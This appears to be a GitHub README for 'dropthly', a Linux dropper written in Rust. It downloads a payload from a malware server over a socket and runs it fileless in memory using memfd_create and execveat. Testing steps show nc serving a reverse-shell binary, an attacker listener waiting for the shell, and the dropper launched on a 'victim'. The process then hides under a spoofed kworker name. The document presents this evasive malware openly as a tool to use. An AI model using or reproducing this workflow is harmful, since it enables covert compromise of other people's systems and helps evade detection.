_____________________________________________
![maxresdefault](https://github.com/user-attachments/assets/f3d868ab-0eeb-4127-9be6-bc6ff920b0df)
______________________________________________
# DROPTHLY
dropthly is a stealthy dropper for Linux which downloads and executes entire binary in memory without leaving any tracks on victims machine.

## Working
The program just use very simple and direct method to drop payload.
  1) Connect to ip 127.0.0.1 on port 4444 of malware server.<br>
  2) Creates a memory file using <code>memfd_create()</code>.<br>
  3) Reads data from the socket and writes it into the memory file.<br>
  4) Runs the memory file using <code>execveat()</code> when all the data has been transferred and also becomes stealthy.

## Testing
launch the malware-server:
```bash
malware-server$ cat ./revshell | nc -lp 4444
```
lunch revshell listener:
```bash
attacker:$ nc -lnvp 8080 //listening revshell at port 8080
```
Compile and launch dropthly on victims machine:
```bash
victim:$ cargo build --release 
victim:$ ./dropthly
```
We have currently established a TCP connection to victim machine now proceed to check the file descriptors of dropthly.
```bash
attacker:$ ps -ax | grep dropthly 
  37191 pts/5    S+     0:00 grep dropthly
```
No trace of dropthly. Now see how dropthly looks like:
```bash
attacker:$ ps -ax | grep ar.p
  36660 pts/0    S      0:00 [kworker/ar.p] 
  37039 pts/5    S+     0:00 grep ar.p
```
you can change name [kworker/ar.p] to any others from main.rs

## License
This project is licensed under [MIT](https://github.com/0x00snape/dropthly/blob/main/LICENSE)
